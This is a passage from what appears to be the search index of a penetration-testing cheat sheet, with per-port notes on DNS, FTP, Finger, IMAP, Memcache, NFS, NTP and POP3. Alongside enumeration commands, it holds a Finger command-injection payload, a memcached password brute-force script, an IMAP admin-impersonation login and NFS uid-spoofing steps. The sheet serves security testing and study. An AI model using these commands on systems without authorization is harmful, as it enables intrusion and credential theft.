for password cracking with hashcat rules: https://github.com/dafthack/PassphraseGen","title":"Generators"},{"location":"password-attacks/y-Tools/#extraction","text":"Firefox Decrypt - Tool to extract passwords from Mozilla (Firefox/Thunderbird/Seabird) profiles: https://github.com/unode/firefox_decrypt","title":"Extraction"},{"location":"password-attacks/z-References/","text":"References New References LM, NTLM, Net-NTLMv2, oh my!: https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4","title":"References"},{"location":"password-attacks/z-References/#references","text":"","title":"References"},{"location":"password-attacks/z-References/#new-references","text":"LM, NTLM, Net-NTLMv2, oh my!: https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4","title":"New References"},{"location":"protocols-and-ports/Citrix-1494/","text":"Enumeration ./citrix-pa-scan {IP_address/file | - | random} [timeout] citrix-pa-proxy.pl IP_to_proxy_to [Local_IP]","title":"Citrix 1494"},{"location":"protocols-and-ports/Citrix-1494/#enumeration","text":"./citrix-pa-scan {IP_address/file | - | random} [timeout] citrix-pa-proxy.pl IP_to_proxy_to [Local_IP]","title":"Enumeration"},{"location":"protocols-and-ports/DHCP/","text":"Get new IP address from DHCP: dhclient Send DHCPDISCOVER Receive DHCPOFFER","title":"DHCP"},{"location":"protocols-and-ports/DHCP/#get-new-ip-address-from-dhcp","text":"dhclient Send DHCPDISCOVER Receive DHCPOFFER","title":"Get new IP address from DHCP:"},{"location":"protocols-and-ports/DNS-53/","text":"DNS on TCP Check for zone transfers Maybe DNS Sec enabled Dnsrecon dnsrecon -r 127.0.0.0/24 -n 10.10.10.29 dnsrecon -r 127.0.1.0/24 -n 10.10.10.29 dnsrecon -r 10.10.10.0/24 -n 10.10.10.29 Configuration files host.conf resolv.conf named.conf Order of name resolution /etc/nsswitch.conf DNS sever Information /etc/resolv.conf Forward Lookup whois whois example.com whois 50.7.67.186 (reverse) host host -t ns example.com host -t mx example.com host www.example.com - results in IP address host nonexistent.example.com - results in not found error nslookup nslookup ip set type=a google.com server ns1.google.com google.com dig Usage: dig [@global-server] [domain] [q-type] [q-class] {q-opt} {global-d-opt} host [@local-server] {local-d-opt} [ host [@local-server] {local-d-opt} [...]] dig google.com dig google.com mx dig @ns1.google.com google.com Reverse Lookup write the IP-address in reverse order (for e.g. 192.168.1.1 will be 1.1.168.192) append \u201c.in-addr.arpa.\u201d to it. dig 1.1.168.192.in-addr.arpa. PTR for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -\u00ad\u2010v not found https://stackoverflow.com/questions/23981098/how-forward-and-reverse-dns-works Zone Transfers Copying of the zone file from a master DNS server to a slave server host -t axfr domain.name dns-server Root zone: dig axfr @dns-server Domain name: dig axfr @dns-server domain.name host -l example.com ns1.example.com dnsrecon -d $ip -t axfr nmap $ip --script=dns-zone-transfer -p 53 #/bin/bash # Simple Zone Transfer Bash Script # $1 is the first argument given after the bash script # Check if argument was given, if not, print usage if [ -\u00ad\u2010z $1 ]; then echo [*] Simple Zone transfer script echo [*] Usage : $0 domain name exit 0 fi # if argument was given, identify the DNS servers for the domain for server in $(host -\u00ad\u2010t ns $1 |cut -\u00ad\u2010d -\u00ad\u2010f4);do # For each of these servers, attempt a zone transfer host -\u00adl $1 $server |grep has address done Bruteforcing Subdomain bruteforcing for ip in $(cat list.txt); do host $ip.$website; done Reverse dns lookup bruteforcing for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v not found DNS Related Recon Tools fierce scanner that helps locate non-contiguous IP space and hostnames against specified domains. pre-cursor to nmap, unicornscan, nessus, nikto, etc, since all of those require that you already know what IP space you are looking for GitHub: https://github.com/davidpepper/fierce-domain-scanner General checks: fierce -dns example.com Wordlist attack: fierce -dns example.com -wordlist hosts.list recon-ng use recon/contacts/gather/http/api/whois_pocs set DOMAIN example.com run use recon/hosts/enum/http/web/xssed use recon/hosts/gather/http/web/google_site use recon/hosts/gather/http/web/ip_neighbor dnsenum dnsenum $ip dnsrecon dnsrecon dnsrecon \u2010d example.com \u2010t axfr dnsenum dnsenum example.com subbrute Recursively crawls enumerated DNS records Uses open resolvers as a kind of proxy to circumvent DNS rate-limiting knock Wordlist based subdomain bruteforcing Virustotal search Sublist3r Subdomains with Google, Yahoo, Bing, Baidu, Ask, Netcraft, Virustotal, ThreatCrowd, DNSdumpster, and ReverseDNS Can do \"subbrute\" scans internally Can do port scans internally Online Services https://dnsdumpster.com/ DNS Recon Workflow (WIP) 1) Get the host's addresse (A record). 2) Get the namservers (threaded). 3) Get the MX record (threaded). 4) Perform axfr queries on nameservers and get BIND VERSION (threaded). 5) Get extra names and subdomains via google scraping (google query = \"allinurl: -www site:domain\"). 6) Brute force subdomains from file 7) Calculate C class domain network ranges and perform whois queries on them (threaded). 8) Perform reverse lookups on netranges (C class or/and whois netranges) (threaded). 9) Write to domain_ips.txt file ip-blocks. 10) References New References Payload Delivery Over DNS: https://github.com/no0be/DNSlivery DNS Rebind Toolkit https://github.com/Kinimiwar/dns-rebind-toolkit Global DNS Hijacking Campaign: DNS Record Manipulation at Scale: https://eforensicsmag.com/global-dns-hijacking-campaign-dns-record-manipulation-at-scale-by-muks-hirani-sarah-jones-ben-read/","title":"DNS 53"},{"location":"protocols-and-ports/DNS-53/#dns-on-tcp","text":"Check for zone transfers Maybe DNS Sec enabled","title":"DNS on TCP"},{"location":"protocols-and-ports/DNS-53/#dnsrecon","text":"dnsrecon -r 127.0.0.0/24 -n 10.10.10.29 dnsrecon -r 127.0.1.0/24 -n 10.10.10.29 dnsrecon -r 10.10.10.0/24 -n 10.10.10.29","title":"Dnsrecon"},{"location":"protocols-and-ports/DNS-53/#configuration-files","text":"host.conf resolv.conf named.conf","title":"Configuration files"},{"location":"protocols-and-ports/DNS-53/#order-of-name-resolution","text":"/etc/nsswitch.conf","title":"Order of name resolution"},{"location":"protocols-and-ports/DNS-53/#dns-sever-information","text":"/etc/resolv.conf","title":"DNS sever Information"},{"location":"protocols-and-ports/DNS-53/#forward-lookup","text":"","title":"Forward Lookup"},{"location":"protocols-and-ports/DNS-53/#whois","text":"whois example.com whois 50.7.67.186 (reverse)","title":"whois"},{"location":"protocols-and-ports/DNS-53/#host","text":"host -t ns example.com host -t mx example.com host www.example.com - results in IP address host nonexistent.example.com - results in not found error","title":"host"},{"location":"protocols-and-ports/DNS-53/#nslookup","text":"nslookup ip set type=a google.com server ns1.google.com google.com","title":"nslookup"},{"location":"protocols-and-ports/DNS-53/#dig","text":"Usage: dig [@global-server] [domain] [q-type] [q-class] {q-opt} {global-d-opt} host [@local-server] {local-d-opt} [ host [@local-server] {local-d-opt} [...]] dig google.com dig google.com mx dig @ns1.google.com google.com","title":"dig"},{"location":"protocols-and-ports/DNS-53/#reverse-lookup","text":"write the IP-address in reverse order (for e.g. 192.168.1.1 will be 1.1.168.192) append \u201c.in-addr.arpa.\u201d to it. dig 1.1.168.192.in-addr.arpa. PTR for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -\u00ad\u2010v not found https://stackoverflow.com/questions/23981098/how-forward-and-reverse-dns-works","title":"Reverse Lookup"},{"location":"protocols-and-ports/DNS-53/#zone-transfers","text":"Copying of the zone file from a master DNS server to a slave server host -t axfr domain.name dns-server Root zone: dig axfr @dns-server Domain name: dig axfr @dns-server domain.name host -l example.com ns1.example.com dnsrecon -d $ip -t axfr nmap $ip --script=dns-zone-transfer -p 53 #/bin/bash # Simple Zone Transfer Bash Script # $1 is the first argument given after the bash script # Check if argument was given, if not, print usage if [ -\u00ad\u2010z $1 ]; then echo [*] Simple Zone transfer script echo [*] Usage : $0 domain name exit 0 fi # if argument was given, identify the DNS servers for the domain for server in $(host -\u00ad\u2010t ns $1 |cut -\u00ad\u2010d -\u00ad\u2010f4);do # For each of these servers, attempt a zone transfer host -\u00adl $1 $server |grep has address done","title":"Zone Transfers"},{"location":"protocols-and-ports/DNS-53/#bruteforcing","text":"","title":"Bruteforcing"},{"location":"protocols-and-ports/DNS-53/#subdomain-bruteforcing","text":"for ip in $(cat list.txt); do host $ip.$website; done","title":"Subdomain bruteforcing"},{"location":"protocols-and-ports/DNS-53/#reverse-dns-lookup-bruteforcing","text":"for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v not found","title":"Reverse dns lookup bruteforcing"},{"location":"protocols-and-ports/DNS-53/#dns-related-recon-tools","text":"","title":"DNS Related Recon Tools"},{"location":"protocols-and-ports/DNS-53/#fierce","text":"scanner that helps locate non-contiguous IP space and hostnames against specified domains. pre-cursor to nmap, unicornscan, nessus, nikto, etc, since all of those require that you already know what IP space you are looking for GitHub: https://github.com/davidpepper/fierce-domain-scanner General checks: fierce -dns example.com Wordlist attack: fierce -dns example.com -wordlist hosts.list","title":"fierce"},{"location":"protocols-and-ports/DNS-53/#recon-ng","text":"use recon/contacts/gather/http/api/whois_pocs set DOMAIN example.com run use recon/hosts/enum/http/web/xssed use recon/hosts/gather/http/web/google_site use recon/hosts/gather/http/web/ip_neighbor","title":"recon-ng"},{"location":"protocols-and-ports/DNS-53/#dnsenum","text":"dnsenum $ip","title":"dnsenum"},{"location":"protocols-and-ports/DNS-53/#dnsrecon_1","text":"dnsrecon dnsrecon \u2010d example.com \u2010t axfr dnsenum dnsenum example.com","title":"dnsrecon"},{"location":"protocols-and-ports/DNS-53/#subbrute","text":"Recursively crawls enumerated DNS records Uses open resolvers as a kind of proxy to circumvent DNS rate-limiting","title":"subbrute"},{"location":"protocols-and-ports/DNS-53/#knock","text":"Wordlist based subdomain bruteforcing Virustotal search","title":"knock"},{"location":"protocols-and-ports/DNS-53/#sublist3r","text":"Subdomains with Google, Yahoo, Bing, Baidu, Ask, Netcraft, Virustotal, ThreatCrowd, DNSdumpster, and ReverseDNS Can do \"subbrute\" scans internally Can do port scans internally","title":"Sublist3r"},{"location":"protocols-and-ports/DNS-53/#online-services","text":"https://dnsdumpster.com/","title":"Online Services"},{"location":"protocols-and-ports/DNS-53/#dns-recon-workflow-wip","text":"1) Get the host's addresse (A record). 2) Get the namservers (threaded). 3) Get the MX record (threaded). 4) Perform axfr queries on nameservers and get BIND VERSION (threaded). 5) Get extra names and subdomains via google scraping (google query = \"allinurl: -www site:domain\"). 6) Brute force subdomains from file 7) Calculate C class domain network ranges and perform whois queries on them (threaded). 8) Perform reverse lookups on netranges (C class or/and whois netranges) (threaded). 9) Write to domain_ips.txt file ip-blocks. 10)","title":"DNS Recon Workflow (WIP)"},{"location":"protocols-and-ports/DNS-53/#references","text":"","title":"References"},{"location":"protocols-and-ports/DNS-53/#new-references","text":"Payload Delivery Over DNS: https://github.com/no0be/DNSlivery DNS Rebind Toolkit https://github.com/Kinimiwar/dns-rebind-toolkit Global DNS Hijacking Campaign: DNS Record Manipulation at Scale: https://eforensicsmag.com/global-dns-hijacking-campaign-dns-record-manipulation-at-scale-by-muks-hirani-sarah-jones-ben-read/","title":"New References"},{"location":"protocols-and-ports/FTP-21/","text":"Scan for anonymous FTP nmap \u2010v \u2010p 21 -\u00ad\u2010script=ftp\u2010anon.nse 192.168.11.200-254 Anonymous login ftp ip_address Username: anonymous Password: any@email.com (if prompted) Bruteforce Hydra Medusa Brutus Config files ftpusers ftp.conf proftpd.conf MITM pasvagg.pl: https://packetstormsecurity.com/0007-exploits/pasvagg.pl Common FTP Commands Command Description ? Request help ascii Set the mode of file transfer to ASCII (default / transmits 7bits per character) binary Set the mode of file transfer to binary (transmits all 8bits per byte and thus provides less chance of a transmission error and must be used to transmit files other than ASCII files) bye Exit the FTP environment (same as quit) cd Change directory on the remote machine close Rerminate a connection with another computer close brubeck Closes the current FTP connection with brubeck, but still leaves you within the FTP environment. delete Delete a file in the current remote directory (same as rm in UNIX) get Copy one file from the remote machine to the local machine get ABC DEF Copies file ABC in the current remote directory to (or on top of) a file named DEF in your current local directory. get ABC Copies file ABC in the current remote directory to (or on top of) a file with the same name, ABC, in your current local directory. help Request a list of all available FTP command lcd Change directory on your local machine (same as UNIX cd) ls List the names of the files in the current remote directory mkdir Make a new directory within the current remote directory mget Copy multiple files from the remote machine to the local machine; you are prompted for a y/n answer before transferring each file mget * Copies all the files in the current remote directory to your current local directory, using the same filenames. Notice the use of the wild card character, *. mput Copy multiple files from the local machine to the remote machine; you are prompted for a y/n answer before transferring each file open Open a connection with another computer open brubeck Opens a new FTP connection with brubeck; you must enter a username and password for a brubeck account (unless it is to be an anonymous connection). put Copy one file from the local machine to the remote machine pwd Find out the pathname of the current directory on the remote machine quit Exit the FTP environment (same as bye) rmdir Remove a directory in the current remote directory","title":"FTP 21"},{"location":"protocols-and-ports/FTP-21/#scan-for-anonymous-ftp","text":"nmap \u2010v \u2010p 21 -\u00ad\u2010script=ftp\u2010anon.nse 192.168.11.200-254","title":"Scan for anonymous FTP"},{"location":"protocols-and-ports/FTP-21/#anonymous-login","text":"ftp ip_address Username: anonymous Password: any@email.com (if prompted)","title":"Anonymous login"},{"location":"protocols-and-ports/FTP-21/#bruteforce","text":"Hydra Medusa Brutus","title":"Bruteforce"},{"location":"protocols-and-ports/FTP-21/#config-files","text":"ftpusers ftp.conf proftpd.conf","title":"Config files"},{"location":"protocols-and-ports/FTP-21/#mitm","text":"pasvagg.pl: https://packetstormsecurity.com/0007-exploits/pasvagg.pl","title":"MITM"},{"location":"protocols-and-ports/FTP-21/#common-ftp-commands","text":"Command Description ? Request help ascii Set the mode of file transfer to ASCII (default / transmits 7bits per character) binary Set the mode of file transfer to binary (transmits all 8bits per byte and thus provides less chance of a transmission error and must be used to transmit files other than ASCII files) bye Exit the FTP environment (same as quit) cd Change directory on the remote machine close Rerminate a connection with another computer close brubeck Closes the current FTP connection with brubeck, but still leaves you within the FTP environment. delete Delete a file in the current remote directory (same as rm in UNIX) get Copy one file from the remote machine to the local machine get ABC DEF Copies file ABC in the current remote directory to (or on top of) a file named DEF in your current local directory. get ABC Copies file ABC in the current remote directory to (or on top of) a file with the same name, ABC, in your current local directory. help Request a list of all available FTP command lcd Change directory on your local machine (same as UNIX cd) ls List the names of the files in the current remote directory mkdir Make a new directory within the current remote directory mget Copy multiple files from the remote machine to the local machine; you are prompted for a y/n answer before transferring each file mget * Copies all the files in the current remote directory to your current local directory, using the same filenames. Notice the use of the wild card character, *. mput Copy multiple files from the local machine to the remote machine; you are prompted for a y/n answer before transferring each file open Open a connection with another computer open brubeck Opens a new FTP connection with brubeck; you must enter a username and password for a brubeck account (unless it is to be an anonymous connection). put Copy one file from the local machine to the remote machine pwd Find out the pathname of the current directory on the remote machine quit Exit the FTP environment (same as bye) rmdir Remove a directory in the current remote directory","title":"Common FTP Commands"},{"location":"protocols-and-ports/Finger-79/","text":"User enumeration finger @example.com finger 'a b c d e f g h' @example.com finger '1 2 3 4 5 6 7 8 9 0'@target_host finger admin@example.com finger user@example.com finger 0@example.com finger .@example.com finger **@example.com finger test@example.com http://pentestmonkey.net/tools/user-enumeration/finger-user-enum finger-user-enum.pl -U seclists/Usernames/Names/names.txt -t ip Finger Redirect finger @target_host1@target_host2 Command execution finger |/bin/id@example.com finger |/bin/ls -a /@example.com Finger Bounce Hop from one finger deamon to another. Request will get logged as if it arrived from a relay. finger@host.com@victim.com References Summarized References Giving the Finger to port 79 / Simple Finger Deamon Tutorial by Paris2K: http://cd.textfiles.com/hmatrix/Tutorials/hTut_0269.html http://0daysecurity.com/penetration-testing/enumeration.html","title":"Finger 79"},{"location":"protocols-and-ports/Finger-79/#user-enumeration","text":"finger @example.com finger 'a b c d e f g h' @example.com finger '1 2 3 4 5 6 7 8 9 0'@target_host finger admin@example.com finger user@example.com finger 0@example.com finger .@example.com finger **@example.com finger test@example.com http://pentestmonkey.net/tools/user-enumeration/finger-user-enum finger-user-enum.pl -U seclists/Usernames/Names/names.txt -t ip","title":"User enumeration"},{"location":"protocols-and-ports/Finger-79/#finger-redirect","text":"finger @target_host1@target_host2","title":"Finger Redirect"},{"location":"protocols-and-ports/Finger-79/#command-execution","text":"finger |/bin/id@example.com finger |/bin/ls -a /@example.com","title":"Command execution"},{"location":"protocols-and-ports/Finger-79/#finger-bounce","text":"Hop from one finger deamon to another. Request will get logged as if it arrived from a relay. finger@host.com@victim.com","title":"Finger Bounce"},{"location":"protocols-and-ports/Finger-79/#references","text":"","title":"References"},{"location":"protocols-and-ports/Finger-79/#summarized-references","text":"Giving the Finger to port 79 / Simple Finger Deamon Tutorial by Paris2K: http://cd.textfiles.com/hmatrix/Tutorials/hTut_0269.html http://0daysecurity.com/penetration-testing/enumeration.html","title":"Summarized References"},{"location":"protocols-and-ports/HTTP-HTTPS-80,443/","text":"Please check /web dedicated folder.","title":"HTTP HTTPS 80,443"},{"location":"protocols-and-ports/IMAP-143,993/","text":"References https://tools.ietf.org/html/rfc3501 Cheatsheet - https://busylog.net/telnet-imap-commands-note/ IMAP Capabilities Commands Extensions Connecting Port 143 (plain / no SSL) telnet IP 143 nc --crlf --verbose IP 143 Port 993 (SSL) openssl s_client -connect IP :993 openssl s_client -connect IP :993 -crlf -quiet Command Format Input RandomStringID command Response RandomStringID OK ANSWER DETAIL Login Login Method A1 login someuser@example.com My_P@ssword1 When AUTH=PLAIN (SASL PLAIN Method) echo -en \\0someuser@example.com\\0My_P@ssword1 | openssl base64 a authenticate plain send null separated encoded username, password When AUTH=LOGIN (SASL AUTH LOGIN) echo -en someuser@example.com | openssl base64 echo -en My_P@ssword1 | base64 a AUTHENTICATE LOGIN send encoded username send encoded password SASL PLAIN as an Admin User (Masquerade another user) authcidNULauthzidNULpassword echo -en someuser@example.com\\0admin\\0admin1234 | openssl base64 a authenticate plain send encoded authcidNULauthzidNULpassword Capability a capability Retrieving Emails and Modifying the Inbox Namespaces n namespace Examine Inbox ex1 EXAMINE INBOX List of folders LIST mailbox path search argument L1 list INBOX/ * mailbox path if empty list shows all content from root search argument case-sensitive mailbox name with possible wildcards - is a wildcard, and matches zero or more characters at this position. % is similar to * but it does not match a hierarchy delimiter Fetch Messages f1 FETCH 1 BODY[] f2 fetch 2 RFC822 f3 fetch 1:4 (BODY[HEADER.FIELDS (Subject)]) Unseen s search UNSEEN Delete d store 2 +FLAGS (\\Deleted) e expunge","title":"IMAP 143,993"},{"location":"protocols-and-ports/IMAP-143,993/#references","text":"https://tools.ietf.org/html/rfc3501 Cheatsheet - https://busylog.net/telnet-imap-commands-note/ IMAP Capabilities Commands Extensions","title":"References"},{"location":"protocols-and-ports/IMAP-143,993/#connecting","text":"Port 143 (plain / no SSL) telnet IP 143 nc --crlf --verbose IP 143 Port 993 (SSL) openssl s_client -connect IP :993 openssl s_client -connect IP :993 -crlf -quiet","title":"Connecting"},{"location":"protocols-and-ports/IMAP-143,993/#command-format","text":"Input RandomStringID command Response RandomStringID OK ANSWER DETAIL","title":"Command Format"},{"location":"protocols-and-ports/IMAP-143,993/#login","text":"","title":"Login"},{"location":"protocols-and-ports/IMAP-143,993/#login-method","text":"A1 login someuser@example.com My_P@ssword1","title":"Login Method"},{"location":"protocols-and-ports/IMAP-143,993/#when-authplain-sasl-plain-method","text":"echo -en \\0someuser@example.com\\0My_P@ssword1 | openssl base64 a authenticate plain send null separated encoded username, password","title":"When AUTH=PLAIN (SASL PLAIN Method)"},{"location":"protocols-and-ports/IMAP-143,993/#when-authlogin-sasl-auth-login","text":"echo -en someuser@example.com | openssl base64 echo -en My_P@ssword1 | base64 a AUTHENTICATE LOGIN send encoded username send encoded password","title":"When AUTH=LOGIN (SASL AUTH LOGIN)"},{"location":"protocols-and-ports/IMAP-143,993/#sasl-plain-as-an-admin-user-masquerade-another-user","text":"authcidNULauthzidNULpassword echo -en someuser@example.com\\0admin\\0admin1234 | openssl base64 a authenticate plain send encoded authcidNULauthzidNULpassword","title":"SASL PLAIN as an Admin User (Masquerade another user)"},{"location":"protocols-and-ports/IMAP-143,993/#capability","text":"a capability","title":"Capability"},{"location":"protocols-and-ports/IMAP-143,993/#retrieving-emails-and-modifying-the-inbox","text":"Namespaces n namespace Examine Inbox ex1 EXAMINE INBOX List of folders LIST mailbox path search argument L1 list INBOX/ * mailbox path if empty list shows all content from root search argument case-sensitive mailbox name with possible wildcards - is a wildcard, and matches zero or more characters at this position. % is similar to * but it does not match a hierarchy delimiter Fetch Messages f1 FETCH 1 BODY[] f2 fetch 2 RFC822 f3 fetch 1:4 (BODY[HEADER.FIELDS (Subject)]) Unseen s search UNSEEN Delete d store 2 +FLAGS (\\Deleted) e expunge","title":"Retrieving Emails and Modifying the Inbox"},{"location":"protocols-and-ports/IRC-8067/","text":"Version / Connect irssi -c 10.10.10.117 --port 8067","title":"IRC 8067"},{"location":"protocols-and-ports/IRC-8067/#version-connect","text":"irssi -c 10.10.10.117 --port 8067","title":"Version / Connect"},{"location":"protocols-and-ports/LDAP-389/","text":"Configuration files containers.ldif ldap.cfg ldap.conf ldap.xml ldap-config.xml ldap-realm.xml slapd.conf Tools Softerra LDAP Administrator Jxplorer active directory domain services management pack for system center LDAP Admin Tool LDAP Administrator tool","title":"LDAP 389"},{"location":"protocols-and-ports/LDAP-389/#configuration-files","text":"containers.ldif ldap.cfg ldap.conf ldap.xml ldap-config.xml ldap-realm.xml slapd.conf","title":"Configuration files"},{"location":"protocols-and-ports/LDAP-389/#tools","text":"Softerra LDAP Administrator Jxplorer active directory domain services management pack for system center LDAP Admin Tool LDAP Administrator tool","title":"Tools"},{"location":"protocols-and-ports/Memcache/","text":"Connecting telnet localhost 11211 Information gathering nmap -p 11211 --script memcached-info memcstat --servers=127.0.0.1 Read value memccat --servers=192.64.38.3 --username=user --password=pass flag $ nc localhost 112111 get password VALUE password 0 6 3dw4rd END Key information and dump values version stats items STAT items:3:number 1 STAT items:3:age 498 STAT items:22:number 1 STAT items:22:age 498 END stats cachedump stab-id limit stats cachedump 3 100 ITEM views.decorators.cache.cache_header..cc7d9 [6 b; 1256056128 s] END Increment decrement incr id 1 decr id 1 Set new entry set phone 0 60 9 123456789 Modify value replace key 0 0 2 new-value prepend address 0 0 6 house append address 0 0 6 ,73301 Delete delete old_address flush_all 30 invalidate all keys after 30 s Dump all keys memcdump --verbose --debug --servers=127.0.0.1 | tee keys.lst Dump all key-values memcached-tool localhost:11211 dump | less while read -r key; do [ -f $key ] || echo get $key | nc localhost 11211 $key.dump ; done (memcdump --server localhost) memcdump --servers=localhost | xargs -L1 -I% sh -c 'echo get % | nc localhost 11211' function memcmd() { exec {memcache} /dev/tcp/localhost/11211 printf %s\\n%s\\n $* quit ${memcache} cat ${memcache} } 1.4.31 and above memcmd lru_crawler metadump all 1.4.30 and below memcmd stats items memcmd stats cachedump 1 0 for id in $(memcmd stats items | grep -o :[0-9]\\+: | tr -d : | sort -nu); do memcmd stats cachedump $id 0 done Libraries Python: https://github.com/abstatic/python-memcached-stats Bruteforce #!/usr/bin/python3 import subprocess dictionary=open( /usr/share/wordlists/rockyou.txt ) for pwd in dictionary: out=subprocess.getoutput('memcstat --servers=192.64.38.3 --username=student --password='+pwd) if len(out) 0: print(out) print( PASSWORD: +pwd) break","title":"Memcache"},{"location":"protocols-and-ports/Memcache/#connecting","text":"telnet localhost 11211","title":"Connecting"},{"location":"protocols-and-ports/Memcache/#information-gathering","text":"nmap -p 11211 --script memcached-info memcstat --servers=127.0.0.1","title":"Information gathering"},{"location":"protocols-and-ports/Memcache/#read-value","text":"memccat --servers=192.64.38.3 --username=user --password=pass flag $ nc localhost 112111 get password VALUE password 0 6 3dw4rd END","title":"Read value"},{"location":"protocols-and-ports/Memcache/#key-information-and-dump-values","text":"version stats items STAT items:3:number 1 STAT items:3:age 498 STAT items:22:number 1 STAT items:22:age 498 END stats cachedump stab-id limit stats cachedump 3 100 ITEM views.decorators.cache.cache_header..cc7d9 [6 b; 1256056128 s] END","title":"Key information and dump values"},{"location":"protocols-and-ports/Memcache/#increment-decrement","text":"incr id 1 decr id 1","title":"Increment decrement"},{"location":"protocols-and-ports/Memcache/#set-new-entry","text":"set phone 0 60 9 123456789","title":"Set new entry"},{"location":"protocols-and-ports/Memcache/#modify-value","text":"replace key 0 0 2 new-value prepend address 0 0 6 house append address 0 0 6 ,73301","title":"Modify value"},{"location":"protocols-and-ports/Memcache/#delete","text":"delete old_address flush_all 30 invalidate all keys after 30 s","title":"Delete"},{"location":"protocols-and-ports/Memcache/#dump-all-keys","text":"memcdump --verbose --debug --servers=127.0.0.1 | tee keys.lst","title":"Dump all keys"},{"location":"protocols-and-ports/Memcache/#dump-all-key-values","text":"memcached-tool localhost:11211 dump | less while read -r key; do [ -f $key ] || echo get $key | nc localhost 11211 $key.dump ; done (memcdump --server localhost) memcdump --servers=localhost | xargs -L1 -I% sh -c 'echo get % | nc localhost 11211' function memcmd() { exec {memcache} /dev/tcp/localhost/11211 printf %s\\n%s\\n $* quit ${memcache} cat ${memcache} }","title":"Dump all key-values"},{"location":"protocols-and-ports/Memcache/#1431-and-above","text":"memcmd lru_crawler metadump all","title":"1.4.31 and above"},{"location":"protocols-and-ports/Memcache/#1430-and-below","text":"memcmd stats items memcmd stats cachedump 1 0 for id in $(memcmd stats items | grep -o :[0-9]\\+: | tr -d : | sort -nu); do memcmd stats cachedump $id 0 done","title":"1.4.30 and below"},{"location":"protocols-and-ports/Memcache/#libraries","text":"Python: https://github.com/abstatic/python-memcached-stats","title":"Libraries"},{"location":"protocols-and-ports/Memcache/#bruteforce","text":"#!/usr/bin/python3 import subprocess dictionary=open( /usr/share/wordlists/rockyou.txt ) for pwd in dictionary: out=subprocess.getoutput('memcstat --servers=192.64.38.3 --username=student --password='+pwd) if len(out) 0: print(out) print( PASSWORD: +pwd) break","title":"Bruteforce"},{"location":"protocols-and-ports/Modbus-502/","text":"Tools Map a SCADA MODBUS TCP based network: https://packetstormsecurity.com/UNIX/scanners/modscan.py.txt","title":"Modbus 502"},{"location":"protocols-and-ports/Modbus-502/#tools","text":"Map a SCADA MODBUS TCP based network: https://packetstormsecurity.com/UNIX/scanners/modscan.py.txt","title":"Tools"},{"location":"protocols-and-ports/MySQL-3306/","text":"Please check /databases/mysql dedicated folder.","title":"MySQL 3306"},{"location":"protocols-and-ports/NFS-2049/","text":"Configuration files /etc/exports /etc/lib/nfs/xtab Enumeration nmap -sV --script=nfs-ls $ip showmount -e hostname/ip_address mount -t nfs ip_address:/directory_found_exported /local_mount_point Tools NFS shell - Provides user level access to an NFS server, over UDP or TCP, supports source routing and \"secure\" (privileged port) mounts - https://github.com/NetDirect/nfsshell nfsshell host ip nfsshell mount name of the share nfsshell gid 1000 nfsshell uid 1000 nfsshell put example nfsshell chmod 0777 example References New References http://linuxadministrative.blogspot.com/2014/09/showmount-command-examples.html Exploiting Network File System, (NFS), shares: http://www.vulnerabilityassessment.co.uk/nfs.htm","title":"NFS 2049"},{"location":"protocols-and-ports/NFS-2049/#configuration-files","text":"/etc/exports /etc/lib/nfs/xtab","title":"Configuration files"},{"location":"protocols-and-ports/NFS-2049/#enumeration","text":"nmap -sV --script=nfs-ls $ip showmount -e hostname/ip_address mount -t nfs ip_address:/directory_found_exported /local_mount_point","title":"Enumeration"},{"location":"protocols-and-ports/NFS-2049/#tools","text":"NFS shell - Provides user level access to an NFS server, over UDP or TCP, supports source routing and \"secure\" (privileged port) mounts - https://github.com/NetDirect/nfsshell nfsshell host ip nfsshell mount name of the share nfsshell gid 1000 nfsshell uid 1000 nfsshell put example nfsshell chmod 0777 example","title":"Tools"},{"location":"protocols-and-ports/NFS-2049/#references","text":"","title":"References"},{"location":"protocols-and-ports/NFS-2049/#new-references","text":"http://linuxadministrative.blogspot.com/2014/09/showmount-command-examples.html Exploiting Network File System, (NFS), shares: http://www.vulnerabilityassessment.co.uk/nfs.htm","title":"New References"},{"location":"protocols-and-ports/NTP-123/","text":"Configuration files ntp.conf Tools ntptrace Query to determine from where the NTP server updates its time and traces the chain of NTP servers from a source ntpdc Query the ntp Deamon about its current state and to request changes in the state ntpdc -c monlist IP_ADDRESS ntpdc -c sysinfo IP_ADDRESS ntpq Monitors NTP daemon ntpd operations and determine performance Defend NTPSec IPTables logging","title":"NTP 123"},{"location":"protocols-and-ports/NTP-123/#configuration-files","text":"ntp.conf","title":"Configuration files"},{"location":"protocols-and-ports/NTP-123/#tools","text":"","title":"Tools"},{"location":"protocols-and-ports/NTP-123/#ntptrace","text":"Query to determine from where the NTP server updates its time and traces the chain of NTP servers from a source","title":"ntptrace"},{"location":"protocols-and-ports/NTP-123/#ntpdc","text":"Query the ntp Deamon about its current state and to request changes in the state ntpdc -c monlist IP_ADDRESS ntpdc -c sysinfo IP_ADDRESS","title":"ntpdc"},{"location":"protocols-and-ports/NTP-123/#ntpq","text":"Monitors NTP daemon ntpd operations and determine performance","title":"ntpq"},{"location":"protocols-and-ports/NTP-123/#defend","text":"NTPSec IPTables logging","title":"Defend"},{"location":"protocols-and-ports/Oracle-1521/","text":"References New References http://0daysecurity.com/penetration-testing/enumeration.html","title":"References"},{"location":"protocols-and-ports/Oracle-1521/#references","text":"","title":"References"},{"location":"protocols-and-ports/Oracle-1521/#new-references","text":"http://0daysecurity.com/penetration-testing/enumeration.html","title":"New References"},{"location":"protocols-and-ports/POP3-110/","text":"Login USER username PASS password Other commands Command Comment USER Your user name for this mail server PASS Your password. QUIT End your session. STAT Number and total size of all messages LIST Message# and size of message RETR message# Retrieve selected message DELE message# Delete selected message NOOP No-op. Keeps you connection open. RSET Reset the mailbox. Undelete deleted messages. TOP 1 0 Return headers only TOP 1 10 Return headers and first 10 lines of body","title":"POP3 110"},{"location":"protocols-and-ports/POP3-110/#login","text":"USER username PASS password","title":"Login"},{"location":"protocols-and-ports/POP3-110/#other-commands","text":"Command Comment USER Your user name for this mail server PASS Your password. QUIT End your session. STAT Number and total size of all messages LIST Message# and size of message RETR message# Retrieve selected message DELE message# Delete selected message NOOP No-op. Keeps you connection open. RSET Reset the mailbox. 